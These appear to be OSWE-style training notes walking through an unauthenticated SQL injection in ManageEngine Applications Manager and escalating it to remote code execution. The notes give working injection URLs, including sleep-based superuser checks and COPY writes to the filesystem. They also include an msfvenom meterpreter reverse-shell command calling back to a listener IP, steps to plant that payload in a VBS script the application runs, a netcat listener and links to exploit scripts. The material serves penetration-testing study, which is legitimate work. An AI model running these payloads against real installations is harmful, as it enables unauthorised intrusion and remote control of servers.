# ManageEngine SQLI to RCE
In this module we have demonstrated how to discover an unauthenticated SQL injection vulnerability using source code audit in a Java-based web application.
We then showed how to use time-based blind SQL injection payloads along with stack queries in order to exfiltrate database information.
Finally, we developed an exploit that utilized Postgres User Defined Functions and Large Objects to gain a fully functional reverse shell.
## Vulnerability Discovery
By browsing through the ManageEngine’s Application Manager web interface, we can see that most URLs contain the `.do` extension. `.do` extension is typically used in a URL mapping scheme for **compiled Java code**.
Java web applications use a deployment descriptor file named **`web.xml`** to determine how URLs map to servlets, which URLs require authentication, and other information.
### Source Code Analysis
- Search for SQL queries in the source decompiled code in notepad++ using regx: `^.*?query.*?select.*?` (this expression basically says: Look for any line that begins with any number of alphanumeric characters which is followed by the string `query` which is followed by a number of any characters which is followed by the string `select` which is followed by a number of any characters.)
- To reduce a web app’s attack surface, start with the front-end and review HTTP handlers. In Java servlets, these are easily found by their consistent naming pattern, like **`doGet`** and **`doPost`**.
- Enable PostgreSQL logging from its configuration file `postgresql.conf`, search for the string `log_statement`, uncomment the line then set its value to `all` and **restart the service** to apply the changes. Start inspecting the logs `Get-Content C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\postgresql_13.log -wait -tail 1`
- `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;` by injecting a special character (`;`) into the vulnerable parameter, we can check the logs for any syntax errors to verify if the injection was successful using the following command: `Get-Content postgresql_13.log -tail 100 | Select-String -pattern "syntax error"`
## Exploitation
- PGSQL supports stacked queries `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);`
- if the app filters the quotes `'`, PostgreSQL supports `$$` (dollar-quoting) as a replacement for single quotes (`'`) to simplify writing strings that contain literal quotes.
- The attacker tests a SQL injection vulnerability to confirm DBA privileges by using a payload that checks if `current_setting('is_superuser')` returns `"on"`. If true, it triggers a 10-second delay via `pg_sleep(10)`, confirming administrative access. `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+`
- Use SQLI to write to the file system `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+`
- Invistige if any VB scripts are being executed after performaing some action (Creating a Monitor in our case) via ProcMon. If we have ability to write to the file system, we can inject a backdoor into this VB script and it will be executed automatically by the application.
### Accessing the file system
#### Backdoor Crafting
1. **Making the original script one liner**
Match and replace roles in Notepad++ :
- `'.*` (remove the comments)
- ` _.*?\n` with `✅ matches newline` option enabled (remove continuation lines)
- `    ` (remove tabs)
- match `\n` replace with `:` (remove newline and replace it with `:` which is the VB script command terminator)
2. **Create reverse shell**
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
```
Match and replace roles in Notepad++ (to make the payload oneliner):

- ` _.*?\n` with `✅ matches newline` option enabled (remove continuation lines)
- `    ` (remove tabs)
- match `\n` replace with `:` (remove newline and replace it with `:` which is the VB script command terminator) **If you copied from the terminal, match on `\n\r` instead of jsut `\n`**
- mach `::` replace with `:` **repeat this multiple times** (remove consecutive conlons and replace it by only one colon)
3. **Final Payload**
  - We will paste out modified msfvenom payload just before `:WScript.Quit(0):`, as: `Echo serviceData:Next:PAYLOAD_HERE:WScript.Quit(0):`
4. **Write the payload to the target file system using the SQLI**
  - Encode the payload into Base64 then URL encode it
  - write it to to `wmiget.vbs` using `copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;`
  - Final SQLI query looks like this:
    ```
    /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;copy (select convert_from(decode($$ENCODED_PAYLOAD_HERE$$,$$base64$$),$$utf-8$$)) to $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
    ```
  - change request method to POST and send the request
5. **Open a Netcat listener**
  ```
nc -nlvp 1337
  ```
**Exploitation Script:** https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/ManageEngine/windows_rce.py
### Large Object Reverse Shell
Keep in mind that working with large objects only works on the DBA level. Non-administrative users would not have the required permissions for these actions.

**Exploitaion Script:** https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/ManageEngine/pg_lo_injection_rce.py
